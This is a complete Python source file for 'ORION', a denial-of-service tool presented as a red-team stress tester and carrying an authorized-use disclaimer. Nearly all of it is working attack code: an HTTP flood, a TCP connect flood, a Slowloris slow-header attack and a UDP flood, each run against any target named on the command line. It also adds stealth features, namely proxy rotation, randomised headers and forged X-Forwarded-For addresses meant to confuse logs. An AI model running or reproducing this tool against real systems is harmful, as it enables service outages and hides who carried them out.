#!/usr/bin/env python3
"""
ORION: Red Team Network Resilience & Stress Tester
Author: J0J0M0J0
Version: 2.1.0 (Stealth Upgrade)

DISCLAIMER:
This tool is for AUTHORIZED SECURITY TESTING ONLY (Red Team Operations).
Using this tool against systems you do not own or have explicit permission to test is ILLEGAL.
The creator is NOT responsible for any misuse or damage caused by this tool.
"""

import asyncio
import argparse
import sys
import random
import time
import socket
from abc import ABC, abstractmethod
from typing import List, Optional

import aiohttp
from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.style import Style

# Try importing aiohttp_socks, exit if not found
try:
    from aiohttp_socks import ProxyConnector
except ImportError:
    ProxyConnector = None # Handled in setup

# --- Global Configuration ---
USER_AGENTS = [
    "Orion/2.1 (RedTeam-Security-Audit; +http://localhost)",
    "Mozilla/5.0 (Compatible; OrionSafetyTest/2.0)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
]

console = Console()

BANNER = r"""
              #####                    ****                     #####   
              #######                 ******                   ######             
          ####   ##########           ******             ##########  ###          
         #####           #######       ****        ########         #####        
         #####                #####             #####               #####        
           #####################  #   #####     # ######################         
                              ###   #########   ###                            
                       #######    ############      ######                       
                     ##########   #############    #########                     
                   ###########    #############    ###########                   
                 ######       ##  ############# ##         ######                 
               #####        #####  ###########  ####         #####               
             ****#        *******#  #########   #******         #****             
           ****         **+++***     ######      ***+++***        ****           
         ***          *++++*+  ***  *+++++++*  *** ++++++**          ***         
       **           *+++++    *+++  ++++++++   +++*    ++++++*          **       
                  +++++       +=+    +=====+    +=+      +++++*                  
                ++++         +=+     +=====+     +=+        ++++*                
              ++==          +=+      +=====+      +=+          ==++              
            ++=            ===       =----=        ===            ==+            
                           ==        =----=         ==              =++         
                          ==         =----=          ==                          
                         ==          =-::-=           ==                         
                         =            =::=             =                         
                        =             =::=              =                        
                       -              =..=               -                       
                      :               :.:                 :                       
                                      :::                                       
                                      :::                                        
                                      ---                                        
                                      |||
           .        .        .      .      .
      
 ██████╗ ██████╗ ██╗ ██████╗ ███╗   ██╗
██╔═══██╗██╔══██╗██║██╔═══██╗████╗  ██║
██║   ██║██████╔╝██║██║   ██║██╔██╗ ██║
██║   ██║██╔══██╗██║██║   ██║██║╚██╗██║
╚██████╔╝██║  ██║██║╚██████╔╝██║ ╚████║
 ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝

       .    .    *  .   .  .   .
               ,---.
             /     \
            |   O   |  [ PLANET ORION ]
             \     /
              `---`
      .    *      .      .     *   .
"""

class Stats:
    def __init__(self):
        self.requests_sent = 0
        self.failed = 0
        self.success = 0
        self.start_time = time.time()
        self.running = True

    @property
    def elapsed(self):
        return time.time() - self.start_time

    @property
    def rate(self):
        if self.elapsed == 0: return 0
        return self.requests_sent / self.elapsed

class ProxyManager:
    """Manages Proxy Rotation"""
    def __init__(self, proxy_list_path: Optional[str] = None, single_proxy: Optional[str] = None):
        self.proxies = []
        if single_proxy:
            self.proxies.append(single_proxy)
        if proxy_list_path:
            try:
                with open(proxy_list_path, 'r') as f:
                    self.proxies.extend([line.strip() for line in f if line.strip()])
            except Exception as e:
                console.print(f"[bold red][!] Error loading proxies: {e}[/bold red]")
        
        self.enabled = len(self.proxies) > 0
        if self.enabled:
            console.print(f"[bold blue][*] Stealth Mode Enabled: Loaded {len(self.proxies)} Proxies[/bold blue]")

    def get_proxy(self) -> Optional[str]:
        if not self.enabled: return None
        return random.choice(self.proxies)

class AttackModule(ABC):
    def __init__(self, target: str, port: int, stats: Stats, semaphore: asyncio.Semaphore, proxy_manager: ProxyManager):
        self.target = target
        self.port = port
        self.stats = stats
        self.semaphore = semaphore
        self.proxy_manager = proxy_manager

    def _get_random_headers(self):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": random.choice(REFERERS),
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
        }
        # Fake Forwarded-For for extra confusion (might trigger some generic protections but confuses logs)
        fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        headers["X-Forwarded-For"] = fake_ip
        return headers

    @abstractmethod
    async def attack(self):
        pass

class Betelgeuse(AttackModule):
    """Async HTTP Flood"""
    async def attack(self):
        async with self.semaphore:
            if not self.stats.running: return
            try:
                timeout = aiohttp.ClientTimeout(total=5)
                proxy = self.proxy_manager.get_proxy()
                connector = ProxyConnector.from_url(proxy) if proxy and ProxyConnector else None
                
                # If no proxy connector (library missing) but proxy set, fallback or warn? 
                # For now assuming library is present if proxies are loaded.
                
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    headers = self._get_random_headers()
                    async with session.get(self.target, headers=headers) as response:
                        self.stats.requests_sent += 1
                        if response.status == 200:
                            self.stats.success += 1
                        else:
                            # 403/429 counts as failed success in stress testing? or just response..
                            # We count valid HTTP responses as success for connection, checks code later
                            if response.status in [403, 429, 500, 502, 503]:
                                self.stats.success += 1 # Server is responding, even if blocking
                            else:
                                self.stats.success += 1
            except Exception:
                self.stats.requests_sent += 1
                self.stats.failed += 1

class Rigel(AttackModule):
    """Async TCP Connect Flood"""
    async def attack(self):
        async with self.semaphore:
            if not self.stats.running: return
            try:
                proxy = self.proxy_manager.get_proxy()
                if proxy and ProxyConnector:
                    # aiohttp_socks can creating raw proxied sockets
                    # from aiohttp_socks import open_connection, create_connection
                    from aiohttp_socks import open_connection as sock_open_connection
                    reader, writer = await asyncio.wait_for(
                        sock_open_connection(proxy_url=proxy, host=self.target, port=self.port), timeout=5.0
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target, self.port), timeout=3.0
                    )
                
                writer.close()
                await writer.wait_closed()
                self.stats.requests_sent += 1
                self.stats.success += 1
            except Exception:
                self.stats.requests_sent += 1
                self.stats.failed += 1

class Bellatrix(AttackModule):
    """Slowloris Style Attack - AsyncIO Implementation"""
    async def attack(self):
        async with self.semaphore:
            if not self.stats.running: return
            try:
                proxy = self.proxy_manager.get_proxy()
                
                if proxy and ProxyConnector:
                     from aiohttp_socks import open_connection as sock_open_connection
                     reader, writer = await asyncio.wait_for(
                        sock_open_connection(proxy_url=proxy, host=self.target, port=self.port), timeout=8.0
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target, self.port), timeout=5.0
                    )
                
                # Send initial partial header
                payload = f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode("utf-8")
                payload += f"Host: {self.target}\r\n".encode("utf-8")
                
                random_headers = self._get_random_headers()
                for h, v in random_headers.items():
                    payload += f"{h}: {v}\r\n".encode("utf-8")
                
                writer.write(payload)
                await writer.drain()
                
                self.stats.requests_sent += 1
                
                # Keep the connection open by sending speculative bytes
                for _ in range(15): # Hold for ~15 seconds max per connection
                    if not self.stats.running: break
                    await asyncio.sleep(1) # Wait 1 second
                    writer.write(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    await writer.drain()
                
                self.stats.success += 1
                writer.close()
                await writer.wait_closed()
                
            except Exception:
                self.stats.failed += 1

class Mintaka(AttackModule):
    """UDP Flood Simulation"""
    async def attack(self):
        async with self.semaphore:
            if not self.stats.running: return
            try:
                # UDP Proxying usually requires SOCKS5 UDP Associate which is complex and often not supported
                # We will just warn user in main that UDP is not proxied, or skip proxy here.
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes_to_send = random._urandom(1024) # 1KB payload
                
                # Send a burst
                sock.sendto(bytes_to_send, (self.target, self.port))
                
                self.stats.requests_sent += 1
                self.stats.success += 1 
                sock.close()
            except Exception:
                self.stats.failed += 1

class OrionCore:
    def __init__(self, args):
        self.args = args
        self.stats = Stats()
        self.semaphore = asyncio.Semaphore(args.concurrency)
        self.proxy_manager = ProxyManager(args.proxylist, args.proxy)
        self.tasks = []

    def get_layout(self) -> Layout:
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="body", ratio=1),
            Layout(name="footer", size=3)
        )
        
        stealth_status = "[bold green]ENABLED[/bold green]" if self.proxy_manager.enabled else "[bold red]DISABLED[/bold red]"
        
        # Header
        layout["header"].update(Panel(f"[bold red]PROJECT ORION v2.1[/bold red] - Target: [cyan]{self.args.target}[/cyan] | Stealth: {stealth_status}", style="on black"))
        
        # Body (Stats)
        table = Table(title="Live Telemetry", expand=True)
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="magenta")
        table.add_row("Requests Sent", str(self.stats.requests_sent))
        table.add_row("Success", f"[green]{self.stats.success}[/green]")
        table.add_row("Failed", f"[red]{self.stats.failed}[/red]")
        table.add_row("Rate (req/s)", f"{self.stats.rate:.2f}")
        table.add_row("Elapsed", f"{self.stats.elapsed:.1f}s")
        layout["body"].update(Panel(table))

        # Footer
        layout["footer"].update(Panel("Press CTRL+C to Abort Mission"))
        
        return layout

    async def run(self):
        # Determine Attack Module
        target_host = self.args.target
        target_port = self.args.port
        
        # Simple URL parsing for Betelgeuse
        if self.args.mode == "betelgeuse":
            if not target_host.startswith("http"):
                 console.print("[bold red]Error: Betelgeuse requires http:// or https:// URL[/bold red]")
                 return

        # Simple IP extraction for Rigel (quick & dirty, better parsing in Phase 2)
        if self.args.mode == "rigel":
             target_host = target_host.replace("http://", "").replace("https://", "").split("/")[0]

        if self.args.mode == "mintaka" and self.proxy_manager.enabled:
            console.print("[bold yellow][!] WARNING: UDP Mode (Mintaka) does not support proxying in this version. Attacks will expose IP.[/bold yellow]")
            await asyncio.sleep(2)

        # Check for proxy lib
        if self.proxy_manager.enabled and ProxyConnector is None:
             console.print("[bold red]ERROR: Stealth Mode requires 'aiohttp-socks'. Install it first.[/bold red]")
             return

        
        # Main Attack Loop
        console.print(f"[bold green][*] Engaging {self.args.mode.upper()} systems...[/bold green]")
        
        # Setup specific module class
        module_map = {
            "betelgeuse": Betelgeuse,
            "rigel": Rigel,
            "bellatrix": Bellatrix,
            "mintaka": Mintaka
        }
        
        if self.args.mode not in module_map:
            console.print("[red]Unknown Mode[/red]")
            return

        attacker_class = module_map[self.args.mode]
        
        # Display Banner
        console.print(f"[bold cyan]{BANNER}[/bold cyan]")
        console.print(f"[bold white]Made by J0J0M0J0[/bold white]")
        console.print(f"[bold green][*] Engaging {self.args.mode.upper()} systems...[/bold green]")
        
        # Live Display Context
        with Live(self.get_layout(), refresh_per_second=4, screen=True) as live:
            while self.stats.elapsed < self.args.time and self.stats.running:
                # Launch a batch of tasks
                # Create a task
                attacker = attacker_class(target_host, target_port, self.stats, self.semaphore, self.proxy_manager)
                task = asyncio.create_task(attacker.attack())
                self.tasks.append(task)
                
                # Cleanup finished tasks to prevent memory leak
                self.tasks = [t for t in self.tasks if not t.done()]
                
                # Update UI
                live.update(self.get_layout())
                
                # Yield control to let tasks run
                await asyncio.sleep(0.01)

            # Final update
            live.update(self.get_layout())
            self.save_report()

    def save_report(self):
        import json
        from datetime import datetime
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        report = {
            "target": self.args.target,
            "mode": self.args.mode,
            "timestamp": timestamp,
            "duration": self.stats.elapsed,
            "total_requests": self.stats.requests_sent,
            "success": self.stats.success,
            "failed": self.stats.failed,
            "rate_per_second": self.stats.rate,
            "stealth": self.proxy_manager.enabled
        }
        
        filename = f"orion_report_{self.args.mode}_{timestamp}.json"
        try:
            with open(filename, "w") as f:
                json.dump(report, f, indent=4)
            console.print(f"\n[bold green][*] Mission Report Saved: {filename}[/bold green]")
        except Exception as e:
            console.print(f"\n[bold red][!] Failed to save report: {e}[/bold red]")

    def stop(self):
        self.stats.running = False


def main():
    parser = argparse.ArgumentParser(description="Orion Red Team Tool v2.1 (Stealth)")
    parser.add_argument("--target", required=True, help="Target URL or IP")
    parser.add_argument("--mode", choices=["betelgeuse", "rigel", "bellatrix", "mintaka"], required=True, help="Attack Mode")
    parser.add_argument("--port", type=int, default=80, help="Target Port (for TCP/UDP modes)")
    parser.add_argument("--concurrency", type=int, default=50, help="Concurrent Connections (Warheads)")
    parser.add_argument("--time", type=int, default=30, help="Duration in seconds")
    
    # Stealth Args
    parser.add_argument("--proxy", help="Single Proxy URL (e.g., socks5://127.0.0.1:9050)")
    parser.add_argument("--proxylist", help="File containing list of proxies")

    args = parser.parse_args()
    
    # Handle event loop
    core = OrionCore(args)
    
    try:
        asyncio.run(core.run())
    except KeyboardInterrupt:
        core.stop()
        console.print("\n[bold yellow][!] SYSTEM HALTED (Mission Aborted)[/bold yellow]")
    except Exception as e:
        console.print(f"\n[bold red]CRITICAL FAILURE: {e}[/bold red]")

if __name__ == "__main__":
    main()
